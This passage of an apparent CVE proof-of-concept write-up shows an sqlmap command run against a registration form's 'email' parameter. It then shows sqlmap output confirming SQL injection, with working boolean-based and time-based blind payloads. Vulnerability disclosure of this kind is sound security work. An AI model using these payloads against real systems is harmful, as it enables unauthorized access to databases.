[![notepad](https://github.com/gurudattch/CVEs/raw/main/assets/6.png)](https://github.com/gurudattch/CVEs/blob/main/assets/6.png)

6. Now Run **sqlmap** on this request

`sqlmap -r register_req.txt -p email`

POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 433 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=&firstname=fname&middlename=midname&lastname=lnmae&gender=Male&email=mytest@mail.com' AND 4940=4940 AND 'oqjL'='oqjL&password=password

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=&firstname=fname&middlename=midname&lastname=lnmae&gender=Male&email=mytest@mail.com' AND (SELECT 7178 FROM (SELECT(SLEEP(5)))MFQU) AND 'aOrZ'='aOrZ&password=password
